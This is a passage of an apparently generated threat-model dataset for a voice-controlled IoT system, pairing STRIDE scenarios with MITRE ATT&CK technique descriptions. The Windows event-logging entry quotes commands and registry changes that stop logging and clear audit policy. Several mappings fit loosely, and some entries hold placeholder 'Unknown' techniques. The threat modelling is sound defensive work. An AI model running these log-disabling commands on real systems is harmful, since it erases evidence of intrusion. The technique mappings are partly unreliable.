            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having issued a specific voice command that resulted in an adverse action.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log voice commands with corresponding user identifiers.",
                    "Role": "System",
                    "Condition": "Lack of comprehensive logging and audit trails."
                },
                {
                    "Assumption": "There is no mechanism to verify the origination of a command.",
                    "Role": "System",
                    "Condition": "No voice print identification."
                }
            ],
            "Potential Impact": "Difficulty in tracing and auditing actions, leading to potential misuse without accountability.",
            "MITRE ATT&CK Keywords": [
                "audit",
                "logging",
                "repudiation",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could exploit weak authentication to perform actions and then deny responsibility.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks robust user authentication.",
                    "Role": "System",
                    "Condition": "No multi-factor authentication."
                },
                {
                    "Assumption": "Action records do not have sufficient user linkage for validation.",
                    "Role": "System",
                    "Condition": "Insufficient metadata in logs."
                }
            ],
            "Potential Impact": "Inability to attribute actions to specific users, compromising accountability.",
            "MITRE ATT&CK Keywords": [
                "authentication",
                "repudiation",
                "logging",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could claim that the system malfunctioned and performed unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The system does not keep detailed logs of commands and responses.",
                    "Role": "System",
                    "Condition": "Logs are incomplete or insufficient."
                },
                {
                    "Assumption": "There is no way to cross-verify logs with actual system performance.",
                    "Role": "System",
                    "Condition": "Lack of monitoring tools."
                }
            ],
            "Potential Impact": "False claims about system malfunctions, leading to distrust and potential legal implications.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "monitoring",
                "repudiation",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts audio signals in transit between the client-side application and the server, capturing sensitive voice data.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels are not encrypted.",
                    "Role": "System",
                    "Condition": "No use of secure communication protocols."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Presence in the same network or ability to intercept traffic."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive voice data, violating user privacy.",
            "MITRE ATT&CK Keywords": [
                "network",
                "interception",
                "data exfiltration",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored on cloud services get accessed by unauthorized personnel due to weak access control policies.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not properly secured.",
                    "Role": "System Component",
                    "Condition": "Weak or default access policies."
                },
                {
                    "Assumption": "Sensitive data is not encrypted.",
                    "Role": "System",
                    "Condition": "Lack of data encryption at rest."
                }
            ],
            "Potential Impact": "Exposure of sensitive information to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "access control",
                "data exposure",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to stored user patterns and preferences from the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can exploit vulnerabilities in the cloud service.",
                    "Role": "Attacker",
                    "Condition": "Unpatched vulnerabilities or misconfigurations."
                },
                {
                    "Assumption": "Sensitive user data is not properly segregated.",
                    "Role": "System",
                    "Condition": "Data is stored without adequate access controls."
                }
            ],
            "Potential Impact": "Breach of user confidentiality and potential profiling without consent.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "data breach",
                "information disclosure",
                "user data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server with fake audio signals, overwhelming its capacity to process legitimate voice commands.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have throttling mechanisms.",
                    "Role": "System Component",
                    "Condition": "Lack of rate limiting."
                },
                {
                    "Assumption": "Network infrastructure can be overloaded by excessive traffic.",
                    "Role": "Network",
                    "Condition": "Limited bandwidth or processing power."
                }
            ],
            "Potential Impact": "Disruption of service availability, preventing legitimate use.",
            "MITRE ATT&CK Keywords": [
                "dos",
                "server",
                "audio signals",
                "overload"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the client-side application with a flood of network traffic, causing it to crash and stop processing user commands.",
            "Assumptions": [
                {
                    "Assumption": "The client application does not handle traffic spikes well.",
                    "Role": "Client-Side Application",
                    "Condition": "Lack of robust traffic management."
                },
                {
                    "Assumption": "Network infrastructure is susceptible to flooding attacks.",
                    "Role": "Network",
                    "Condition": "No anti-DDoS measures in place."
                }
            ],
            "Potential Impact": "Unavailability of client-side functionalities, affecting overall system performance.",
            "MITRE ATT&CK Keywords": [
                "ddos",
                "client",
                "application",
                "crash"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in IoT devices to send continuous control requests, causing them to malfunction or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are not designed to handle high-frequency control requests.",
                    "Role": "IoT Devices",
                    "Condition": "Inadequate request handling mechanisms."
                },
                {
                    "Assumption": "The system does not restrict the rate at which control requests can be sent.",
                    "Role": "IoT Controller",
                    "Condition": "Lack of rate limiting."
                }
            ],
            "Potential Impact": "Degraded performance or complete unavailability of IoT devices, impacting user operations.",
            "MITRE ATT&CK Keywords": [
                "iot",
                "device",
                "flood",
                "malfunction"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to execute commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The client application has vulnerable code that can be exploited.",
                    "Role": "Client-Side Application",
                    "Condition": "Presence of software vulnerabilities."
                },
                {
                    "Assumption": "The attacker has access to the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Compromised user device or network access."
                }
            ],
            "Potential Impact": "Execution of unauthorized actions with elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "client",
                "exploitation",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to IoT devices by exploiting firmware vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "The IoT devices have exploitable firmware vulnerabilities.",
                    "Role": "IoT Devices",
                    "Condition": "Unpatched or outdated firmware."
                },
                {
                    "Assumption": "The attacker has the capability to exploit these vulnerabilities remotely.",
                    "Role": "Attacker",
                    "Condition": "Access to the network where IoT devices are deployed."
                }
            ],
            "Potential Impact": "Full control over IoT devices, potentially causing harmful actions and data breaches.",
            "MITRE ATT&CK Keywords": [
                "iot",
                "firmware",
                "exploitation",
                "root access"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages cloud service misconfigurations to gain administrative control over the application.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service has misconfigured permissions.",
                    "Role": "Cloud Service",
                    "Condition": "Incorrect privilege settings."
                },
                {
                    "Assumption": "The attacker can exploit these misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Access to the cloud service or its APIs."
                }
            ],
            "Potential Impact": "Administrative control over the system, allowing for extensive privilege misuse.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "misconfiguration",
                "administrative",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to issue voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Microphones inadequately distinguish between users' voices.",
                    "Role": "System Designer",
                    "Condition": "Poor voice recognition software."
                },
                {
                    "Assumption": "No additional authentication methods are in place.",
                    "Role": "Security Engineer",
                    "Condition": "System relies solely on voice recognition."
                },
                {
                    "Assumption": "Attacker has access to the microphone.",
                    "Role": "System Administrator",
                    "Condition": "Physical or remote access to the device."
                }
            ],
            "Potential Impact": "Unauthorized access to IoT devices and potential manipulation of system settings.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "voice command",
                "IoT device control"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Traffic between the client-side application and server-side application is intercepted and impersonated.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption in communication channels.",
                    "Role": "Network Engineer",
                    "Condition": "Use of unsecured protocols."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Network Administrator",
                    "Condition": "Unmonitored or unprotected network."
                },
                {
                    "Assumption": "Attacker can alter or replay captured data.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient network monitoring and defense mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized data access and potential system manipulation.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "packet replay",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker tricks the IoT controller into executing malicious commands.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller lacks robust authentication measures.",
                    "Role": "IoT Developer",
                    "Condition": "Basic or no authentication mechanisms."
                },
                {
                    "Assumption": "Attacker can communicate with the IoT controller.",
                    "Role": "Network Administrator",
                    "Condition": "Insecure network configuration."
                },
                {
                    "Assumption": "Commands sent to IoT devices are not validated.",
                    "Role": "IoT System Designer",
                    "Condition": "Absence of verification protocols."
                }
            ],
            "Potential Impact": "Malicious control of IoT devices leading to unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "device impersonation",
                "command injection",
                "IoT control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Alteration of client-side application code to send different instructions.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application is not adequately protected.",
                    "Role": "Application Developer",
                    "Condition": "Lack of code integrity checks."
                },
                {
                    "Assumption": "Attacker has access to the application source or deployment.",
                    "Role": "System Administrator",
                    "Condition": "Weak physical or network security."
                },
                {
                    "Assumption": "Security patches are not up to date.",
                    "Role": "IT Maintenance Team",
                    "Condition": "Delayed or skipped updates."
                }
            ],
            "Potential Impact": "Unauthorized commands and data corruption.",
            "MITRE ATT&CK Keywords": [
                "code alteration",
                "software manipulation",
                "unauthorized instructions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of data being sent from the server to the client-side application.",
            "Assumptions": [
                {
